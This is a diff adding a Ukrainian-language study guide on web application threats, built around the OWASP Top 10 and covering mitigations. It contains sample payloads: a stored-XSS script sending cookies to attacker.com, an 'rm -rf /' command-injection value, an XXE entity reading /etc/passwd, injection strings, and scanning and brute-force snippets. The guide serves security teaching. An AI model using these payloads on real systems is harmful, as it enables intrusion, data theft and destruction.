@@ -1058,3 +1058,559 @@ Chief Information Security Officer (CISO)
 
 
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+# Типи загроз для веб-додатків
+
+---
+
+## Огляд веб-загроз
+
+Веб-додатки є одними з найбільш вразливих компонентів сучасної IT-інфраструктури через їх доступність через Інтернет та складність архітектури. Розуміння типів загроз є критично важливим для ефективного захисту.
+
+---
+
+## OWASP Top 10 2021 - Найкритичніші загрози
+
+### 🔓 **A01 - Broken Access Control**
+**Опис:** Порушення механізмів контролю доступу, що дозволяє користувачам діяти поза межами їх дозволів.
+
+**Підтипи загроз:**
+```
+🚨 Vertical Privilege Escalation - підвищення рівня доступу
+🚨 Horizontal Privilege Escalation - доступ до чужих даних
+🚨 IDOR (Insecure Direct Object References)
+🚨 Path Traversal - доступ до файлової системи
+🚨 CORS Misconfiguration - неправильна конфігурація CORS
+```
+
+**Приклад атаки:**
+```http
+# Оригінальний запит
+GET /api/user/profile/123
+
+# Атака IDOR
+GET /api/user/profile/124
+GET /api/user/profile/125
+# Доступ до профілів інших користувачів
+```
+
+**Потенційний вплив:**
+- Доступ до конфіденційних даних
+- Модифікація даних інших користувачів
+- Повна компрометація додатка
+
+### 🔐 **A02 - Cryptographic Failures**
+**Опис:** Слабкості в криптографічному захисті даних під час зберігання та передачі.
+
+**Підтипи загроз:**
+```
+🚨 Weak Encryption Algorithms - застарілі алгоритми
+🚨 Hardcoded Credentials - захардкожені паролі
+🚨 Insecure Data Transmission - незахищена передача
+🚨 Poor Key Management - поганий менеджмент ключів
+🚨 Insufficient Entropy - слабкі генератори випадкових чисел
+```
+
+**Приклад уразливості:**
+```javascript
+// Небезпечно - MD5 хешування
+const crypto = require('crypto');
+const hash = crypto.createHash('md5').update(password).digest('hex');
+
+// Безпечно - bcrypt з salt
+const bcrypt = require('bcrypt');
+const hash = await bcrypt.hash(password, 12);
+```
+
+### 💉 **A03 - Injection**
+**Опис:** Injection атаки виникають, коли недовірені дані надсилаються інтерпретатору як частина команди або запиту.
+
+**Типи Injection атак:**
+
+#### **SQL Injection**
+```sql
+-- Вразливий код
+SELECT * FROM users WHERE username = '$username' AND password = '$password'
+
+-- Payload атакувальника
+username: admin'--
+password: anything
+
+-- Результуючий запит
+SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything'
+```
+
+#### **NoSQL Injection**
+```javascript
+// Вразливий MongoDB запит
+db.users.find({username: req.body.username, password: req.body.password})
+
+// Payload атакувальника
+{"username": {"$ne": null}, "password": {"$ne": null}}
+```
+
+#### **Command Injection**
+```python
+# Вразливий код
+import os
+filename = request.form['filename']
+os.system(f"cat {filename}")
+
+# Payload атакувальника
+filename = "file.txt; rm -rf /"
+```
+
+#### **LDAP Injection**
+```java
+// Вразливий LDAP запит
+String filter = "(&(uid=" + username + ")(password=" + password + "))";
+```
+
+### 🏗️ **A04 - Insecure Design**
+**Опис:** Недоліки в архітектурі та дизайні додатка, які не можна виправити простою реалізацією.
+
+**Приклади проблем:**
+```
+🚨 Missing threat modeling during design
+🚨 Insecure design patterns
+🚨 Business logic flaws
+🚨 Insufficient security controls by design
+```
+
+### ⚙️ **A05 - Security Misconfiguration**
+**Опис:** Неправильні налаштування безпеки на будь-якому рівні стека додатка.
+
+**Поширені помилки конфігурації:**
+```
+🚨 Default credentials not changed
+🚨 Unnecessary features enabled
+🚨 Missing security headers
+🚨 Verbose error messages
+🚨 Cloud storage permissions too open
+```
+
+**Приклад небезпечних заголовків:**
+```http
+# Відсутні важливі заголовки безпеки
+HTTP/1.1 200 OK
+Content-Type: text/html
+
+# Безпечна конфігурація
+HTTP/1.1 200 OK
+Content-Type: text/html
+Strict-Transport-Security: max-age=31536000; includeSubDomains
+X-Content-Type-Options: nosniff
+X-Frame-Options: DENY
+Content-Security-Policy: default-src 'self'
+```
+
+### 📦 **A06 - Vulnerable and Outdated Components**
+**Опис:** Використання застарілих або вразливих сторонніх компонентів.
+
+**Ризики:**
+```
+🚨 Known vulnerabilities in dependencies
+🚨 Unsupported software versions
+🚨 Missing security patches
+🚨 Supply chain attacks
+```
+
+### 🔑 **A07 - Identification and Authentication Failures**
+**Опис:** Слабкості в механізмах аутентифікації та управління сеансами.
+
+**Типи атак:**
+```
+🚨 Credential Stuffing - використання викрадених паролів
+🚨 Brute Force - підбір паролів
+🚨 Session Hijacking - перехоплення сеансів
+🚨 Session Fixation - фіксація ідентифікатора сеансу
+```
+
+**Приклад session hijacking:**
+```javascript
+// Вразливо - session ID в URL
+http://example.com/dashboard?sessionid=ABC123
+
+// Безпечно - session ID в захищеному cookie
+Set-Cookie: sessionid=ABC123; HttpOnly; Secure; SameSite=Strict
+```
+
+### 🔧 **A08 - Software and Data Integrity Failures**
+**Опис:** Порушення цілісності програмного забезпечення та даних.
+
+**Загрози:**
+```
+🚨 Unsigned software updates
+🚨 Insecure CI/CD pipelines
+🚨 Deserialization attacks
+🚨 Supply chain compromises
+```
+
+### 📊 **A09 - Security Logging and Monitoring Failures**
+**Опис:** Недостатнє логування та моніторинг подій безпеки.
+
+**Проблеми:**
+```
+🚨 Insufficient logging of security events
+🚨 Logs not monitored for suspicious activity
+🚨 Missing alerting mechanisms
+🚨 Logs stored insecurely
+```
+
+### 🌐 **A10 - Server-Side Request Forgery (SSRF)**
+**Опис:** Вразливість, яка дозволяє атакувальнику змусити сервер виконати запити до несподіваних місць призначення.
+
+**Типи SSRF:**
+```
+🚨 Full SSRF - повний контроль над запитами
+🚨 Blind SSRF - немає прямої відповіді
+🚨 Semi-blind SSRF - часткова інформація
+```
+
+---
+
+## Додаткові категорії веб-загроз
+
+### 🕷️ **Client-Side атаки**
+
+#### **Cross-Site Scripting (XSS)**
+**Типи XSS:**
+
+**Reflected XSS:**
+```html
+<!-- Вразливий код -->
+<p>Search results for: <?php echo $_GET['query']; ?></p>
+
+<!-- Payload атакувальника -->
+http://site.com/search?query=<script>alert('XSS')</script>
+```
+
+**Stored XSS:**
+```html
+<!-- Збережений в базі даних -->
+<div class="comment">
+    <script>
+        // Викрадення cookies
+        document.location='http://attacker.com/steal.php?cookie='+document.cookie;
+    </script>
+</div>
+```
+
+**DOM-based XSS:**
+```javascript
+// Вразливий JavaScript код
+document.getElementById('welcome').innerHTML = "Hello " + location.hash.substring(1);
+
+// URL атакувальника
+http://site.com/page#<img src=x onerror=alert('XSS')>
+```
+
+#### **Cross-Site Request Forgery (CSRF)**
+```html
+<!-- Шкідливий сайт -->
+<form action="http://bank.com/transfer" method="POST">
+    <input type="hidden" name="amount" value="10000">
+    <input type="hidden" name="to_account" value="attacker_account">
+    <input type="submit" value="Click for free money!">
+</form>
+```
+
+**Захист від CSRF:**
+```html
+<!-- CSRF Token -->
+<input type="hidden" name="_token" value="abc123randomtoken">
+```
+
+#### **Clickjacking**
+```html
+<!-- Invisible iframe overlay -->
+<style>
+    iframe { opacity: 0; position: absolute; top: 0; left: 0; }
+</style>
+<iframe src="http://vulnerable-site.com/admin/delete"></iframe>
+<button>Click for prize!</button>
+```
+
+### 🔒 **Business Logic атаки**
+
+#### **Race Conditions**
+```python
+# Вразливий код - race condition
+def transfer_money(from_account, to_account, amount):
+    if get_balance(from_account) >= amount:
+        # Проблема: між перевіркою та списанням може статися інша транзакція
+        time.sleep(0.1)  # Simulation
+        deduct_balance(from_account, amount)
+        add_balance(to_account, amount)
+```
+
+#### **Business Logic Bypass**
+```http
+# Обхід workflow - пропуск етапу оплати
+POST /order/create
+{
+    "items": [{"id": 1, "price": 100}],
+    "status": "paid"  // Атакувальник встановлює status самостійно
+}
+```
+
+#### **Price Manipulation**
+```javascript
+// Клієнтська валідація ціни (небезпечно)
+function calculateTotal() {
+    let price = document.getElementById('price').value;
+    return price * quantity;  // Атакувальник може змінити price в DOM
+}
+```
+
+### 🌐 **API-специфічні загрози**
+
+#### **API1 - Broken Object Level Authorization**
+```http
+# Доступ до чужих ресурсів через API
+GET /api/users/123/orders/456
+# Користувач 123 отримує доступ до замовлення 456, яке може належати іншому користувачу
+```
+
+#### **API2 - Broken User Authentication**
+```javascript
+// Слабка JWT перевірка
+const token = req.headers.authorization;
+const decoded = jwt.decode(token);  // Небезпечно - немає верифікації підпису
+```
+
+#### **API3 - Excessive Data Exposure**
+```json
+// API повертає забагато інформації
+{
+    "user_id": 123,
+    "name": "John Doe",
+    "email": "john@example.com",
+    "password_hash": "$2b$10$...",  // Не повинно бути в API response
+    "ssn": "123-45-6789",           // Чутлива інформація
+    "internal_notes": "VIP customer"
+}
+```
+
+#### **API4 - Lack of Rate Limiting**
+```python
+# Відсутність rate limiting дозволяє brute force
+@app.route('/api/login', methods=['POST'])
+def login():
+    # Немає обмежень на кількість спроб
+    username = request.json['username']
+    password = request.json['password']
+    return authenticate(username, password)
+```
+
+### 📱 **Mobile Web App загрози**
+
+#### **Insecure Data Storage**
+```javascript
+// Небезпечне зберігання в localStorage
+localStorage.setItem('user_token', sensitive_token);
+localStorage.setItem('credit_card', card_number);
+```
+
+#### **Insufficient Transport Layer Protection**
+```javascript
+// HTTP замість HTTPS
+fetch('http://api.example.com/sensitive-data')
+```
+
+### ☁️ **Cloud-специфічні загрози**
+
+#### **Server-Side Template Injection (SSTI)**
+```python
+# Вразливий Flask код
+from flask import Flask, request, render_template_string
+
+@app.route('/hello')
+def hello():
+    name = request.args.get('name')
+    template = f"Hello {name}!"  # Небезпечно
+    return render_template_string(template)
+
+# Payload атакувальника
+# ?name={{7*7}}  // Результат: Hello 49!
+# ?name={{config}}  // Витік конфігурації
+```
+
+#### **XML External Entity (XXE)**
+```xml
+<!-- Шкідливий XML -->
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+    <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>
+    <data>&xxe;</data>
+</root>
+```
+
+#### **Insecure Deserialization**
+```python
+# Небезпечна десеріалізація
+import pickle
+user_data = pickle.loads(request.data)  # Може виконати довільний код
+```
+
+---
+
+## Методи атак та техніки
+
+### 🎯 **Reconnaissance (Розвідка)**
+```bash
+# Інформаційна розвідка
+nmap -sV target.com
+whatweb target.com
+dirb http://target.com/
+gobuster dir -u http://target.com -w wordlist.txt
+```
+
+### 🔍 **Vulnerability Scanning**
+```bash
+# Автоматизоване сканування
+nikto -h http://target.com
+sqlmap -u "http://target.com/page?id=1" --dbs
+```
+
+### 🕳️ **Exploitation**
+```python
+# Приклад автоматизованої атаки
+import requests
+
+# Brute force login
+for password in password_list:
+    response = requests.post('/login', data={
+        'username': 'admin',
+        'password': password
+    })
+    if 'Welcome' in response.text:
+        print(f"Password found: {password}")
+        break
+```
+
+---
+
+## Оцінка ризиків та впливу
+
+### 📊 **CVSS Scoring**
+**Common Vulnerability Scoring System:**
+```
+Base Score = f(Impact, Exploitability)
+
+Impact Metrics:
+- Confidentiality Impact
+- Integrity Impact  
+- Availability Impact
+
+Exploitability Metrics:
+- Attack Vector
+- Attack Complexity
+- Privileges Required
+- User Interaction
+```
+
+### 🎨 **Risk Assessment Matrix**
+```
+                High Impact    Medium Impact    Low Impact
+High Likelihood    CRITICAL      HIGH            MEDIUM
+Med Likelihood     HIGH          MEDIUM          LOW
+Low Likelihood     MEDIUM        LOW             LOW
+```
+
+### 💰 **Business Impact**
+```
+🚨 Data Breach - витік персональних даних
+🚨 Financial Loss - прямі фінансові втрати
+🚨 Reputation Damage - втрата довіри клієнтів
+🚨 Regulatory Fines - штрафи регуляторів
+🚨 Operational Disruption - порушення бізнес-процесів
+```
+
+---
+
+## Захист та мітигація
+
+### 🛡️ **Defense in Depth Strategy**
+
+**Рівень 1 - Perimeter Security:**
+```
+✅ Web Application Firewall (WAF)
+✅ DDoS Protection
+✅ Rate Limiting
+✅ IP Whitelisting/Blacklisting
+```
+
+**Рівень 2 - Application Security:**
+```
+✅ Input Validation
+✅ Output Encoding
+✅ Authentication & Authorization
+✅ Session Management
+```
+
+**Рівень 3 - Data Security:**
+```
+✅ Encryption at Rest
+✅ Encryption in Transit  
+✅ Data Classification
+✅ Access Controls
+```
+
+### 🔧 **Security Headers**
+```http
+# Comprehensive security headers
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'
+X-Content-Type-Options: nosniff
+X-Frame-Options: DENY
+X-XSS-Protection: 1; mode=block
+Referrer-Policy: strict-origin-when-cross-origin
+Permissions-Policy: geolocation=(), microphone=(), camera=()
+```
+
+### 🔍 **Monitoring та Detection**
+```python
+# Security event monitoring
+import logging
+
+security_logger = logging.getLogger('security')
+
+def log_security_event(event_type, user_id, details):
+    security_logger.warning(f"SECURITY_EVENT: {event_type} | User: {user_id} | Details: {details}")
+
+# Usage examples
+log_security_event("FAILED_LOGIN", user_id, f"IP: {ip_address}, Attempts: {attempt_count}")
+log_security_event("PRIVILEGE_ESCALATION", user_id, f"Attempted access to: {resource}")
+log_security_event("SUSPICIOUS_ACTIVITY", user_id, f"Multiple rapid requests from: {ip_address}")
+```
+
+---
+
+## Висновок
+
+Веб-додатки стикаються з широким спектром загроз, від класичних ін'єкцій до сучасних business logic атак. Розуміння цих загроз є першим кроком до створення ефективної стратегії безпеки.
+
+### 🎯 **Ключові принципи захисту:**
+- **Never trust user input** - завжди валідувати вхідні дані
+- **Principle of least privilege** - мінімальні необхідні дозволи
+- **Defense in depth** - багаторівневий захист
+- **Security by design** - безпека з самого початку
+- **Continuous monitoring** - постійний моніторинг
+
+### 📈 **Тренди загроз:**
+- Зростання API атак
+- Supply chain компрометації
+- Cloud-native vulnerabilities
+- AI/ML powered attacks
+- Social engineering evolution
+
+**Пам'ятайте:** Ландшафт загроз постійно еволюціонує, тому критично важливо залишатися в курсі нових атак та регулярно оновлювати заходи безпеки.
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
